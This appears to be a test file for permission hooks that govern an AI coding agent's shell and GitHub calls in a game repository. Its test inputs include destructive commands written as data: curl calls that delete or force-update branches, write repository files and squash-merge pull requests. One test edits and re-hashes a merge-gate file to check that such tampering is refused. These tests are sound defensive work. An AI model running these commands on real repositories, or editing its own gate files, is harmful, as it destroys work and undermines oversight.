  const mcp = (tool_input, env = {}) => decisionOf(hook("github-mcp-guard.sh", { tool_name: "mcp__github__actions_run_trigger", tool_input }, { env }));
  assert.equal(mcp({ method: "cancel_workflow_run", run_id: 1 }), "deny");
  assert.equal(mcp({ method: "force_cancel_workflow_run", run_id: 1 }), "deny");
  assert.equal(mcp({ method: "cancel_workflow_run", run_id: 1 }, { APEX_RUN_CANCEL_OK: "1" }), null, "the user asked");
  const noDesk = { APEX_MERGE_DESK: "" };
  assert.equal(mcp({ method: "rerun_failed_jobs", run_id: 1 }, noDesk), "ask", "a re-run is at most once, infra only");
  assert.equal(mcp({ method: "rerun_workflow_run", run_id: 1 }, noDesk), "ask");
  // WP-D1 (2026-10-27): the merge desk is gone, so APEX_MERGE_DESK=1 no longer silences a re-run; cancels stay denied.
  for (const method of ["rerun_failed_jobs", "rerun_workflow_run"])
    assert.equal(mcp({ method, run_id: 1 }, { APEX_MERGE_DESK: "1" }), "ask", `the desk env no longer passes ${method}`);
  assert.equal(mcp({ method: "cancel_workflow_run", run_id: 1 }, { APEX_MERGE_DESK: "1" }), "deny", "the desk never cancels");
  for (const wf of ["ci.yml", "pages.yml", ".github/workflows/pages.yml", "123456"])
    assert.equal(mcp({ method: "run_workflow", workflow_id: wf, ref: "x" }, { APEX_MERGE_DESK: "1" }), "ask", `a ${wf} dispatch asks (2026-10-26)`);
  assert.equal(mcp({ method: "run_workflow", workflow_id: "gpu-census.yml", ref: "x" }), null, "another workflow's dispatch passes");
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8"));
  const g = settings.hooks.PreToolUse.find((x) => x.hooks.some((h) => h.command.includes("github-mcp-guard.sh")));
  assert.ok(new RegExp(g.matcher).test("mcp__github__actions_run_trigger"), "the matcher must route actions_run_trigger through the guard");
});

// The push hold (#2182, 2026-10-15) was retired on 2026-10-16 (CI/CD review
// #2333 finding 7): a git push is never refused on the queue gauge.
test("2026-10-16: a git push is not held on the queue gauge", () => {
  const repo = scratchRepo("hook-push-nohold-");
  try {
    repo.g("remote", "add", "origin", "https://github.com/brycejmurrin/f1-game.git");
    repo.g("checkout", "-qb", "cursor/topic-1234");
    fs.mkdirSync(path.join(repo.dir, "tools/ci"), { recursive: true });
    fs.writeFileSync(path.join(repo.dir, "tools/ci/queue-depth.mjs"), `console.log("= queue hold (99 Linux jobs in flight / 40, 50 queued, 0 macOS / 5)"); process.exit(1);\n`);
    const run = (command) => hook("bash-guard.sh", bashCall(command, { cwd: repo.dir }), { cwd: repo.dir, env: { APEX_GUARD_PROBE: "" } });
    for (const c of ["git push -u origin cursor/topic-1234", "git push", "git -C . push origin HEAD"]) {
      const r = run(c);
      assert.equal(r.status, 0, `never held: ${c} (${r.stderr})`);
      assert.doesNotMatch(r.stderr, /queue hold/);
    }
  } finally { repo.rm(); }
});

// ── BLOCKER CENSUS (2026-10-15, docs/notes/MCP-ALLOW-RULES-MEASURED-2026-10-15.md §Blocker census) ──
test("protect-files: a git conflict-side or committed-source restore of a generated file passes; any other ref still blocks", () => {
  const repo = scratchRepo("hook-resolve-");
  const run = (command) => hook("protect-files.sh", { tool_name: "Bash", tool_input: { command }, cwd: repo.dir }, { cwd: repo.dir });
  try {
    fs.mkdirSync(path.join(repo.dir, "tests/data"), { recursive: true });
    fs.mkdirSync(path.join(repo.dir, "js"), { recursive: true });
    fs.writeFileSync(path.join(repo.dir, "tests/data/ratchets.json"), "{}\n");
    fs.writeFileSync(path.join(repo.dir, "js/roster.js"), "x\n");
    fs.writeFileSync(path.join(repo.dir, "version.json"), "{}\n");
    // Outside a merge --ours/--theirs restore from the INDEX, which can hold a
    // staged hand edit: the side flags are only conflict resolution mid-merge.
    const SIDES = ["git checkout --theirs tests/data/ratchets.json", "git checkout --ours -- js/roster.js",
      "git checkout -m version.json", "git restore --theirs tests/data/ratchets.json"];
    for (const c of SIDES) {
      const r = run(c);
      assert.equal(r.status, 2, `no merge in progress, so not a resolution: ${c}`);
      assert.match(r.stderr, /GENERATED/, c);
    }
    fs.writeFileSync(path.join(repo.dir, ".git/MERGE_HEAD"), repo.g("rev-parse", "HEAD").stdout);
    for (const c of [...SIDES,
      "git checkout --theirs docs/PHYSICS.md tests/data/ratchets.json",
      "git checkout MERGE_HEAD -- tests/data/ratchets.json",
      "git checkout origin/claude/f1-game-project-26h3ng -- js/roster.js",
      "git restore --source=MERGE_HEAD version.json",
      "git restore -s origin/claude/f1-game-project-26h3ng tests/data/ratchets.json",
      "git restore -sMERGE_HEAD js/roster.js"]) {
      const r = run(c);
      assert.equal(r.status, 0, `conflict resolution is not a hand edit: ${c} (${r.stderr})`);
    }
    // R4-SUPPLY-4 holds: content from an arbitrary ref is still a write the generated rule refuses
    for (const c of ["git checkout origin/x -- version.json", "git restore --source=evil tests/data/ratchets.json",
      "git checkout HEAD -- version.json", "git restore --source=HEAD~3 js/roster.js",
      "git restore -sfeature js/roster.js", "cp /tmp/r.json tests/data/ratchets.json"]) {
      const r = run(c);
      assert.equal(r.status, 2, `must still block: ${c}`);
      assert.match(r.stderr, /GENERATED/, c);
    }
  } finally { repo.rm(); }
});

// PostToolUse stdout is debug-log only: "For most events, Claude Code writes stdout to
// the debug log" — UserPromptSubmit/SessionStart are the exceptions
// (https://code.claude.com/docs/en/hooks, Exit code 0). The advice must travel as
// hookSpecificOutput.additionalContext or the model never reads it (#2228 research).
test("post-edit circuit advice leaves verification until all edits are complete", () => {
  const repo = scratchRepo("hook-postedit-circuit-");
  try {
    fs.mkdirSync(path.join(repo.dir, "js/circuits/scenery"), { recursive: true });
    fs.mkdirSync(path.join(repo.dir, "tools/track"), { recursive: true });
    fs.writeFileSync(path.join(repo.dir, "js/circuits/monza.js"), "var track = {};\n");
    fs.writeFileSync(path.join(repo.dir, "js/circuits/scenery/monza.js"), "var scenery = {};\n");
    const marker = path.join(repo.dir, "verify-ran");
    fs.writeFileSync(path.join(repo.dir, "tools/track/verify-track.cjs"),
      `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'yes');`);
    for (const rel of ["js/circuits/monza.js", "js/circuits/scenery/monza.js"]) {
      const r = hook("post-edit.sh", { tool_name: "Edit", tool_input: { file_path: path.join(repo.dir, rel) } }, { cwd: repo.dir });
      assert.equal(r.status, 0, r.stderr);
      const advice = JSON.parse(r.stdout).hookSpecificOutput.additionalContext;
      assert.equal(advice.trim(), `[post-edit] ${rel} changed: after all circuit and scenery edits, run \`node tools/track/verify-track.cjs monza\` once; no intermediate build was checked`);
      assert.equal(fs.existsSync(marker), false, "no intermediate verification runs");
    }
  } finally { repo.rm(); }
});

test("post-edit group guidance edits the source instead of generated package scripts", () => {
  const repo = scratchRepo("hook-postedit-group-");
  try {
    fs.mkdirSync(path.join(repo.dir, "tests"), { recursive: true });
    fs.mkdirSync(path.join(repo.dir, "tools/gen"), { recursive: true });
    fs.writeFileSync(path.join(repo.dir, "tests/groups.json"), "{}\n");
    fs.writeFileSync(path.join(repo.dir, "tools/gen/gen-test-groups.mjs"), "process.exit(1);\n");
    const r = hook("post-edit.sh", { tool_name: "Edit", tool_input: { file_path: path.join(repo.dir, "tests/groups.json") } }, { cwd: repo.dir });
    assert.equal(r.status, 0, r.stderr);
    const advice = JSON.parse(r.stdout).hookSpecificOutput.additionalContext;
    assert.equal(advice.trim(), "[post-edit] groups.json changed: package.json test:* scripts are STALE — finish the source group " +
      "in tests/groups.json, run `node tools/gen/gen-test-groups.mjs`, then update the docs/TESTING.md group row");
  } finally { repo.rm(); }
});

test("post-edit.sh hands its advice to the model as PostToolUse additionalContext JSON, and stays silent with none", () => {
  const repo = scratchRepo("hook-postedit-");
  const run = (rel) => hook("post-edit.sh", { tool_name: "Write", hook_event_name: "PostToolUse",
    tool_input: { file_path: path.join(repo.dir, rel) }, cwd: repo.dir }, { cwd: repo.dir });
  try {
    fs.mkdirSync(path.join(repo.dir, "js/core"), { recursive: true });
    fs.writeFileSync(path.join(repo.dir, "js/core/log.js"), "function (\n");
    let r = run("js/core/log.js");
    assert.equal(r.status, 0, r.stderr);
    const out = JSON.parse(r.stdout);
    assert.equal(out.hookSpecificOutput.hookEventName, "PostToolUse");
    assert.match(out.hookSpecificOutput.additionalContext, /\[post-edit\] js\/core\/log\.js does not parse/);
    fs.writeFileSync(path.join(repo.dir, "js/core/log.js"), "var ok = 1;\n");
    r = run("js/core/log.js");
    assert.equal(r.status, 0, r.stderr);
    assert.equal(r.stdout.trim(), "", "no advice, no output");
  } finally { repo.rm(); }
});

// #2429: taking one whole side of a multi-hunk conflict warns (advisory, exit 0).
test("git checkout --theirs/--ours warns when the file has several conflict hunks", () => {
  const repo = scratchRepo("hook-theirs-");
  const run = (command) => hook("bash-guard.sh", bashCall(command, { cwd: repo.dir }), { cwd: repo.dir });
  const hunk = "<<<<<<< HEAD\na\n=======\nb\n>>>>>>> other\n";
  try {
    fs.writeFileSync(path.join(repo.dir, "one.txt"), hunk);
    fs.writeFileSync(path.join(repo.dir, "three.txt"), hunk.repeat(3));
    let r = run("git checkout --theirs one.txt");
    assert.equal(r.status, 0, r.stderr);
    assert.doesNotMatch(r.stderr, /conflict hunks/, "one hunk is silent");
    for (const c of ["git checkout --theirs three.txt", "git checkout --ours -- three.txt", "git checkout --conflict=diff3 three.txt"]) {
      r = run(c);
      assert.equal(r.status, 0, `advisory, not a block: ${c}`);
      assert.match(r.stderr, /three\.txt has 3 conflict hunks; this keeps one side for all of them/, c);
    }
    assert.doesNotMatch(run("git checkout three.txt").stderr, /conflict hunks/, "no side flag, no warning");
  } finally { repo.rm(); }
});

// #2428: a tree with no tools/ (track-survey-assets image branches) skips the guards with a note.
test("fast hook delegates staged-tree classification and guard execution to git pre-commit", () => {
  const repo=scratchRepo("hook-fast-");
  try {
    const r=hook("bash-guard.sh",bashCall("git commit -m x"),{cwd:repo.dir});
    assert.equal(r.status,0,r.stderr); assert.equal(r.stdout,"");
    assert.equal(fs.existsSync(path.join(repo.dir,"artifacts/pre-commit-guards.log")),false);
  } finally {repo.rm();}
});
// H4/H5 and the H2 unmark (retro 2026-10-17, hooks H2-H5)
test("H4: a push over a red tooling-fast run is refused; && chains, green logs and the override pass", () => {
  const repo = scratchRepo("hook-pushred-");
  try {
    const push = (command, env = {}) => hook("bash-guard.sh", { tool_name: "Bash", tool_input: { command }, cwd: repo.dir }, { cwd: repo.dir, env });
    const log = path.join(repo.dir, "artifacts/logs/tooling-fast-suite.log");
    fs.mkdirSync(path.dirname(log), { recursive: true });
    // chained with ';' the push runs on a red result: refused before the run starts
    let r = push("node tools/ci/tooling-fast.mjs --changed; git push -u origin x");
    assert.equal(r.status, 2, r.stderr); assert.match(r.stderr, /tooling-fast \.\.\.; git push/);
    r = push("npm run test:tooling-fast -- --changed\ngit push -u origin x");
    assert.equal(r.status, 2, r.stderr);
    assert.notEqual(push("node tools/ci/tooling-fast.mjs --changed && git push -u origin x").status, 2, "&& is the safe join");
    // newest log red, written after HEAD
    fs.writeFileSync(log, "x\n= run failed (39 passed, 1 failed)\n");
    r = push("git push -u origin x");
    assert.equal(r.status, 2, r.stderr); assert.match(r.stderr, /= run failed \(39 passed, 1 failed\)/);
    assert.notEqual(push("git push -u origin x", { APEX_PUSH_FAILED_OK: "1" }).status, 2, "override");
    assert.notEqual(push("APEX_PUSH_FAILED_OK=1 git push -u origin x").status, 2, "inline override");
    assert.notEqual(push("git status").status, 2, "only a push is held");
    fs.writeFileSync(log, "x\n= run passed (40 passed, 0 failed)\n");
    assert.notEqual(push("git push -u origin x").status, 2, "green log");
    // a red log from before HEAD is stale
    fs.writeFileSync(log, "= run failed (1 passed, 1 failed)\n");
    const old = new Date(Date.now() - 86400e3); fs.utimesSync(log, old, old);
    assert.notEqual(push("git push -u origin x").status, 2, "stale log");
  } finally { repo.rm(); }
});

// #1714: a push while a ci.yml run is live warns (advisory) and never blocks.
test("#1714: git push prints the live-run WARN from live-run-check and still passes; non-push stays silent", () => {
  const repo = scratchRepo("hook-pushlive-");
  try {
    const stub = path.join(repo.dir, "live-stub.mjs");
    fs.writeFileSync(stub, 'console.log("WARN: 1 live ci.yml run on x \\u2014 this push cancels them and loses their failures.");\n');
    const quiet = path.join(repo.dir, "quiet-stub.mjs");
    fs.writeFileSync(quiet, "");
    const push = (command, check) => hook("bash-guard.sh", { tool_name: "Bash", tool_input: { command }, cwd: repo.dir }, { cwd: repo.dir, env: { APEX_LIVE_RUN_CHECK: check } });
    let r = push("git push -u origin x", stub);
    assert.notEqual(r.status, 2, r.stderr);
    assert.equal(
      r.stderr.split("\n").filter((l) => l.startsWith("WARN:")).join("\n"),
      "WARN: 1 live ci.yml run on x — this push cancels them and loses their failures.",
    );
    assert.doesNotMatch(push("git push -u origin x", quiet).stderr, /live ci\.yml/, "no live run, no line");
    assert.doesNotMatch(push("git status", stub).stderr, /live ci\.yml/, "only a push warns");
    assert.doesNotMatch(push("git push -u origin x", path.join(repo.dir, "missing.mjs")).stderr, /live ci\.yml/, "a missing check is silent");
  } finally { repo.rm(); }
});

// H1 (#2662): harness Stop hook — memory dir excluded from porcelain; push-hold silences unpushed nag.
test("H1: stop-hook-git-check.sample treats synced memory and a held push as clean (Bryce applies the same to ~/.claude)", () => {
  const sample = path.join(ROOT, "tests/fixtures/stop-hook-git-check.sample.sh");
  const repo = scratchRepo("hook-stophook-");
  const run = (env = {}) => spawnSync("bash", [sample], {
    cwd: repo.dir, encoding: "utf8",
    env: { ...process.env, CLAUDE_PROJECT_DIR: repo.dir, STOP_HOOK_UPSTREAM: "origin/main", ...env },
  });
  try {
    fs.mkdirSync(path.join(repo.dir, ".claude/memory"), { recursive: true });
    fs.writeFileSync(path.join(repo.dir, ".claude/memory/a.md"), "mem\n");
    repo.g("add", "-A"); repo.g("commit", "-qm", "init");
    repo.g("branch", "-M", "main");
    fs.writeFileSync(path.join(repo.dir, ".claude/memory/a.md"), "mem dirty\n");
    assert.equal(run().status, 0, "only .claude/memory dirty must not nag");
    fs.writeFileSync(path.join(repo.dir, "docs/PHYSICS.md"), "other\n");
    assert.equal(run().status, 2, "dirty prose outside memory still nags");
    repo.g("checkout", "-q", "main");
    repo.g("reset", "-q", "--hard");
    const base = repo.g("rev-parse", "HEAD").stdout.trim();
    fs.writeFileSync(path.join(repo.dir, "docs/PHYSICS.md"), "ahead note\n");
    repo.g("add", "docs/PHYSICS.md"); repo.g("commit", "-qm", "ahead");
    repo.g("config", "remote.origin.url", repo.dir);
    repo.g("config", "remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/*");
    repo.g("update-ref", "refs/remotes/origin/main", base);
    assert.equal(run().status, 2, `unpushed commits nag without push-hold (${run().stderr})`);
    fs.writeFileSync(path.join(repo.dir, ".claude/push-hold"), "live CI on pushed tip\n");
    assert.equal(run().status, 0, "push-hold clears the unpushed nag while CI is live");
  } finally { repo.rm(); }
});

test("H5: a loaded box gets the longer guard cap, above it sits the hook timeout; H2 unmark runs before git verbs", () => {
  const src = fs.readFileSync(HOOK, "utf8");
  assert.doesNotMatch(src, /GUARD_T=300/);
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8"));
  for (const h of settings.hooks.PreToolUse.flatMap((g) => g.hooks).filter((h) => h.command.includes("bash-guard.sh")))
    assert.ok(h.timeout <= 30, `fast bash-guard timeout ${h.timeout}`);
  const repo = scratchRepo("hook-unmark-");
  try {
    fs.mkdirSync(path.join(repo.dir, ".claude/memory"), { recursive: true });
    fs.writeFileSync(path.join(repo.dir, ".claude/memory/a.md"), "a\n");
    repo.g("add", "-A"); repo.g("commit", "-qm", "mem");
    repo.g("update-index", "--assume-unchanged", ".claude/memory/a.md");
    assert.match(repo.g("ls-files", "-v").stdout, /^h \.claude\/memory\/a\.md/m);
    const r = hook("bash-guard.sh", { tool_name: "Bash", tool_input: { command: "git add -A && git commit -m x" }, cwd: repo.dir },
      { cwd: repo.dir, env: { APEX_MEMORY_SYNC: "1" } });
    assert.notEqual(r.status, null);
    assert.match(repo.g("ls-files", "-v").stdout, /^H \.claude\/memory\/a\.md/m, "unmarked before the git verb");
  } finally { repo.rm(); }
});

test('diagnostics and UI browser entry points remain parent-owned across MCP and shell', () => {
  const sub = command => hook('bash-guard.sh', bashCall(command, { agent_id: 'a1' }));
  const blocked = [
    "node tools/mcp/apex-tools-mcp.mjs call apex_ui_inspect '{}'",
    "bash tools/mcp/apex-tools-mcp.sh call apex_diagnostics '{\"op\":\"capabilities\"}'",
    "node tools/perf/diagnostics.mjs memory_census '{}'",
    "node tools/perf/diagnostics.mjs gpu_memory_census '{}'",
    "node tools/perf/diagnostics.mjs renderer_probe '{}'",
    "node tools/perf/diagnostics.mjs memory_census '{\"dryRun\":true}'",
    "node tools/perf/diagnostics.mjs unknown '{}'",
    "cd tools/perf && node ./diagnostics.mjs memory_census '{}'",
    "node tools/gfx/mem-census.mjs --plan",
    "node tools/gfx/gpu-mem-census.mjs --dry-run",
    "node tools/gfx/gfx-probe.mjs --plan",
    "node tools/ui/explorer.mjs inspect --screen title",
    "node tools/ui/explorer.mjs replay artifacts/mission.json",
  ];
  for (const command of blocked) {
    assert.equal(sub(command).status, 2, command);
    assert.equal(hook('bash-guard.sh', bashCall(command)).status, 0, 'parent may run: ' + command);
  }
  for (const command of [
    "node tools/perf/diagnostics.mjs vm_lifecycle '{}'",
    "node tools/check/lifecycle-census.mjs --cycles 1",
    "node tools/mcp/apex-tools-mcp.mjs call apex_ui_mission_plan '{\"mission\":\"first-race\"}'",
    "node tools/mcp/apex-tools-mcp.mjs call apex_garage_plan '{}'",
    "node tools/ui/explorer.mjs brief --mission first-race --url http://localhost:3456",
    "node tools/ui/explorer.mjs --list",
    "node tools/shot/garage-angles.mjs --plan",
  ]) assert.equal(sub(command).status, 0, 'browser-free plan/VM remains open: ' + command);
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, '.claude/settings.json'), 'utf8'));
  const matcher = new RegExp(settings.hooks.PreToolUse.find(g => g.hooks.some(h => h.command.includes('mcp-browser-guard.sh'))).matcher);
  for (const tool of ['apex_ui_inspect', 'apex_diagnostics']) {
    const name = 'mcp__apex-tools__' + tool;
    assert.ok(matcher.test(name));
    assert.equal(hook('mcp-browser-guard.sh', { tool_name: name, agent_type: 'worker' }).status, 2);
    assert.equal(hook('mcp-browser-guard.sh', { tool_name: name }).status, 0);
  }
  for (const tool of ['apex_ui_mission_plan', 'apex_garage_plan', 'apex_ui_diff']) {
    const name = 'mcp__apex-tools__' + tool;
    assert.equal(matcher.test(name), false);
    assert.equal(hook('mcp-browser-guard.sh', { tool_name: name, agent_type: 'worker' }).status, 0);
  }
});

// ---- 2026-10-26 system audit §4/§10 (user grant, Bryce 2026-10-26 ~23:00 PT: "Fix hook or guard or perm") ----------
// Every payload is fake: nothing below reaches GitHub (bash-guard only parses the command).

test("GitHub API through curl, wget, node -e fetch and python -c gets the gh api policy (squash deny, ref/contents refuse, close/dispatch ask)", () => {
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-http-"));
  const run = (command, env = {}) => hook("bash-guard.sh", bashCall(command), { env: { APEX_MERGE_DESK: "1", APEX_HELD_CHECK: "0", ...env }, cwd: dir });
  const A = "https://api.github.com/repos/o/r";
  try {
    const deny = [`curl -X PUT ${A}/pulls/9/merge -d '{"merge_method":"squash"}'`, `curl -sS -XPUT --json '{"merge_method": "rebase"}' ${A}/pulls/9/merge`,
      `curl --request=PUT --url ${A}/pulls/9/merge-async -d merge_method=squash`,
      `wget --method=PUT --body-data='{"merge_method":"rebase"}' ${A}/pulls/9/merge`,
      `node -e 'fetch("${A}/pulls/9/merge",{method:"PUT",body:JSON.stringify({merge_method:"squash"})})'`,
      `curl -X POST https://api.github.com/graphql -d '{"query":"mutation { mergePullRequest(input:{pullRequestId:\\"x\\", mergeMethod: SQUASH}) { clientMutationId } }"}'`];
    for (const c of deny) { const r = run(c); assert.equal(decisionOf(r), "deny", `${c}\n${r.stdout}${r.stderr}`); assert.match(r.stdout, /MERGE-COMMIT-ONLY/); }
    const refuse = [[`curl -sS -XDELETE ${A}/git/refs/heads/cursor/x-1`, /safety ban 6/], [`curl -X PATCH ${A}/git/refs/heads/main -d '{"sha":"a","force":true}'`, /safety ban 6/],
      [`node -e 'fetch(\`${A}/git/refs/heads/\${b}\`,{method:"DELETE"})'`, /safety ban 6/],
      [`curl -X POST ${A}/git/refs -d '{"ref":"refs/heads/x","sha":"a"}'`, /safety ban 6/],
      [`curl -X PUT ${A}/contents/js/ui/hud.js -d '{"message":"m","content":"eA=="}'`, /writes repository contents/],
      [`curl -X DELETE ${A}/contents/js/game.js`, /writes repository contents/]];
    for (const [c, why] of refuse) { const r = run(c); assert.equal(r.status, 2, c); assert.match(r.stderr, why, c); }
    const ask = [[`curl -X PUT ${A}/pulls/9/merge`, /merges or arms/], [`curl -X PATCH ${A}/pulls/9 -d '{"state":"closed"}'`, /CLOSES a pull request/],
      [`curl -X PATCH ${A}/issues/9 -d '{"state": "closed"}'`, /CLOSES/], [`curl -X PATCH ${A}/pulls/9 --json '{"draft":false}'`, /full CI tier/],
      [`curl -X POST ${A}/merges -d '{"base":"a","head":"b"}'`, /outside a pull request/],
      [`curl -X PUT ${A}/pulls/9/update-branch`, /sync-pr\.mjs/],
      [`curl -X POST ${A}/actions/workflows/pages.yml/dispatches -d '{"ref":"main"}'`, /release train/],
      [`python3 -c 'import requests; requests.patch("${A}/pulls/9", json={"state":"closed"})'`, /CLOSES/],
      [`curl -X POST https://github.com/o/r/pull/9/merge`, /merges or arms/],
      [`gh api -X PATCH repos/o/r/pulls/9 -f state=closed`, /CLOSES/],
      [`gh api -X POST repos/o/r/actions/workflows/ci.yml/dispatches -f ref=x`, /release train/]];
    for (const [c, why] of ask) { const r = run(c); assert.equal(decisionOf(r), "ask", `${c}\n${r.stdout}${r.stderr}`); assert.match(r.stdout, why, c); }
    const pass = [`curl -sS ${A}/pulls/9`, `curl -sS ${A}/pulls/9/merge`, `curl -X PATCH ${A}/pulls/9 -d '{"body":"x"}'`,
      `curl -X POST ${A}/actions/workflows/gpu-census.yml/dispatches -d '{"ref":"x"}'`, `curl -X POST ${A}/issues/9/comments -d '{"body":"state closed"}'`,
      `curl -sS http://127.0.0.1:3456/version.json`, `node -e 'console.log("https://api.github.com/repos/o/r/pulls/9/merge")'`,
      `echo 'curl -X PUT ${A}/pulls/9/merge -d merge_method=squash'`, `wget -qO- ${A}/pulls/9`];
    for (const c of pass) { const r = run(c); assert.equal(r.status, 0, `${c}: ${r.stderr}`); assert.equal(decisionOf(r), null, `silent pass: ${c} ${r.stdout}`); }
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("shell poll loops are refused: for/while … (ci-watch|gh run|git log|…) … sleep, and seq … sleep", () => {
  const run = (command, env = {}) => hook("bash-guard.sh", bashCall(command), { env: { APEX_HELD_CHECK: "0", ...env } });
  for (const c of ["while true; do node tools/ci/ci-watch.mjs --once; sleep 60; done", "for i in $(seq 1 120); do gh run list -L 1; sleep 30; done",
    "until git log -1 origin/x | grep -q y; do git fetch -q; sleep 20; done", "for i in $(seq 1 5); do cat /proc/loadavg; sleep 1; done",
    "bash -c 'while :; do gh pr checks 12; sleep 30; done'", "while true; do curl -s https://api.github.com/repos/o/r/actions/runs; sleep 10; done"]) {
    const r = run(c);
    assert.equal(r.status, 2, `must refuse: ${c}`);
    assert.match(r.stderr, /shell poll loop/);
  }
  for (const c of ["for f in a b; do node --check $f; done", "while read -r l; do echo $l; done < x", "git commit --dry-run -m 'while true; do ci-watch; sleep 5; done'",
    "for i in 1 2 3; do git push -u origin cursor/x-1 && break; sleep 2; done"])
    assert.notEqual(/shell poll loop/.test(run(c).stderr), true, `not a poll loop: ${c}`);
  assert.equal(run("APEX_POLL_OK=1 for i in $(seq 1 3); do git ls-remote origin; sleep 2; done").status, 0, "the command's own override");
});

test("a subagent may print --help / -h of a launcher that honours it; a test-bg run and the census producers stay refused", () => {
  const sub = (command) => hook("bash-guard.sh", { tool_name: "Bash", tool_input: { command }, agent_id: "a1", agent_type: "worker" }, { env: { APEX_HELD_CHECK: "0" } });
  // test-bg.mjs honours --help since audit4 C2 (strict flags: usage, exit 0, no run), so its help is open too.
  for (const c of ["node tools/shot/agent.mjs --help", "node tools/ci/verify-change.mjs --help", "node tools/ci/verify-change.mjs -h", "node tools/shot/shot.mjs -h", "node tools/ci/test-bg.mjs --help"])
    assert.equal(sub(c).status, 0, `help is not a browser run: ${c} ${sub(c).stderr}`);
  for (const c of ["node tools/ci/test-bg.mjs ui", "node tools/ci/test-bg.mjs --spec tests/specs/abudhabi-foundation.spec.js", "node tools/ci/verify-change.mjs", "node tools/shot/agent.mjs spa view"])
    assert.equal(sub(c).status, 2, `still a browser run: ${c}`);
});

test("github-mcp-guard: close asks, pages/ci dispatch asks, file-write tools are denied; the receipt's gate files must be committed", () => {
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-mcp-sec-"));
  const head = "e".repeat(40);
  const gh = fakeGh(dir, { head });
  const run = (tool_name, tool_input, env = { APEX_MERGE_DESK: "1" }) => hook("github-mcp-guard.sh", { tool_name, tool_input }, { env: { ...gh, ...env }, cwd: dir });
  try {
    assert.equal(decisionOf(run("mcp__github__update_pull_request", { pullNumber: 1, state: "closed" })), "ask");
    assert.equal(decisionOf(run("mcp__github__update_pull_request", { pullNumber: 1, body: "x", state: "open" })), null);
    for (const t of ["push_files", "create_or_update_file", "create_branch", "delete_file"]) {
      const r = run(`mcp__github__${t}`, { owner: "o", repo: "r", branch: "claude/f1-game-project-26h3ng" });
      assert.equal(decisionOf(r), "deny", t); assert.match(r.stdout, /no PR and no CI/);
    }
    assert.equal(decisionOf(run("push_files", { branch: "x" })), "deny", "the Cursor/Codex bare name maps to the same rule");
    // A receipt is only as good as the gate that wrote it (the 2026-10-20 O23 incident).
    // (WP-L4: merges are denied outright, so the gate-file check is exercised on the ready door.)
    writeGateReceipt(dir, "ready", 3, head);
    const merge = () => run("mcp__github__update_pull_request", { pullNumber: 3, draft: false });
    assert.equal(merge().stdout.trim(), "", "a committed gate's receipt passes");
    const gate = path.join(dir, "tools/ci/merge-gate.mjs");
    const orig = fs.readFileSync(gate, "utf8");
    fs.writeFileSync(gate, orig + "\n// --pacing-override\n");
    assert.match(merge().stdout, /"deny".*not the file that wrote this receipt/, "an edited gate file");
    const rc = path.join(dir, "artifacts/ready-gate/3.json");
    const j = JSON.parse(fs.readFileSync(rc, "utf8"));
    j.gateFiles["tools/ci/merge-gate.mjs"] = sha256(gate);   // the edited gate hashed itself
    fs.writeFileSync(rc, JSON.stringify(j));
    assert.match(merge().stdout, /"deny".*differ from HEAD/, "an UNCOMMITTED gate edit is refused even when the hash matches");
    fs.writeFileSync(gate, orig);
    delete j.gateFiles; fs.writeFileSync(rc, JSON.stringify(j));
    assert.match(merge().stdout, /"deny".*no gate-file hashes/, "a receipt from an older gate");
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("settings.json: file-write MCP tools denied, every hook has an explicit timeout, browser guard covers debug chrome and browser-use", () => {
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8"));
  for (const t of ["mcp__github__push_files", "mcp__github__create_or_update_file", "mcp__github__create_branch"])
    assert.ok(settings.permissions.deny.includes(t), `deny ${t}`);
  for (const [ev, groups] of Object.entries(settings.hooks))
    for (const g of groups) for (const h of g.hooks) assert.ok(Number.isFinite(h.timeout), `${ev} ${h.command}: explicit timeout (the default is 600 s)`);
  const browser = settings.hooks.PreToolUse.find((g) => g.hooks.some((h) => h.command.includes("mcp-browser-guard.sh")));
  for (const t of ["mcp__apex-tools__apex_debug_chrome", "mcp__plugin_browser-use_browser-use__navigate", "mcp__playwright-official__browser_click"])
    assert.match(t, new RegExp(browser.matcher), t);
  assert.doesNotMatch("mcp__apex-tools__apex_status", new RegExp(browser.matcher));
  const gh = settings.hooks.PreToolUse.find((g) => g.hooks.some((h) => h.command.includes("github-mcp-guard.sh")));
  assert.match("mcp__github__push_files", new RegExp(gh.matcher));
  const sub = (tool_name, tool_input) => hook("mcp-browser-guard.sh", { tool_name, tool_input, agent_id: "a1" }).status;
  assert.equal(sub("mcp__apex-tools__apex_debug_chrome", { action: "start" }), 2);
  assert.equal(sub("mcp__apex-tools__apex_debug_chrome", { action: "status" }), 0);
  assert.equal(sub("mcp__plugin_browser-use_browser-use__navigate", {}), 2);
});

test("lsp-hint stays quiet for SCREAMING_CASE env names; a CapitalisedSymbol or Head.member still fires", () => {
  const lsp = path.join(ROOT, ".claude/hooks/lsp-hint.py");
  const hint = (command) => !!spawnSync("python3", [lsp], { input: JSON.stringify({ hook_event_name: "PostToolUse", tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8", env: { ...process.env, APEX_LSP_HINT: "" } }).stdout.trim();
  for (const c of ["grep -rn RELAY_URL js/", "grep -rn APEX_MERGE_DESK js", "grep -n TURN js/ui/hud.js"]) assert.equal(hint(c), false, c);
  for (const c of ["grep -rn GameHud js/", "grep -rn Tracks.curvature js", "grep -rn MAT.tarmac js"]) assert.equal(hint(c), true, c);
});

test("a `git stash` while a merge is in progress is refused (MERGE_HEAD would be dropped); reads, pop and a stash after abort pass", () => {
  const repo = scratchRepo("hook-stash-merge-");
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo.dir }),
    cwd: repo.dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: repo.dir },
  });
  try {
    repo.g("checkout", "-qb", "side");
    fs.writeFileSync(path.join(repo.dir, "docs/PHYSICS.md"), "side\n");
    repo.g("commit", "-qam", "side");
